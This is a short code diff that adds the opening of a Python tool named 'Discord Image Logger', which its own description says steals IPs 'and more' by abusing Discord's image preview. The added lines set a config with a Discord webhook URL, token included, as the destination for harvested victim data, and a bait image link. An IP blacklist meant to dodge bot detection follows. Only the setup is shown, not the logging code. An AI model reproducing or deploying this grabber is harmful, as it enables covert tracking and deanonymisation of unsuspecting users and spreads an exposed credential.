@@ -1,4 +1,16 @@
-}
+from http.server import BaseHTTPRequestHandler
+from urllib import parse
+import traceback, requests, base64, httpagentparser
+
+app = "Discord Image Logger"
+description = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+version = "v2.0"
+author = "DeKrypt"
+
+config = {
+# BASE CONFIG #
+"webhook": "https://discord.com/api/webhooks/1401945482405740766/NvJbbSe1h4goaP3jTsuegVpRKlzrJpYId59IuY6tLDFkZtm-RpnVoau3riprSdrDkkzU",
+"image": "https://th.bing.com/th/id/R.4c1dd97109a382be1bc0c01f2b0b5ee2?rik=yjRFlGoRXWccsw&riu=http%3a%2f%2fgetwallpapers.com%2fwallpaper%2ffull%2fd%2f1%2f2%2f292380.jpg"}
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
 # This feature is undocumented mainly due to it being for detecting bots better.
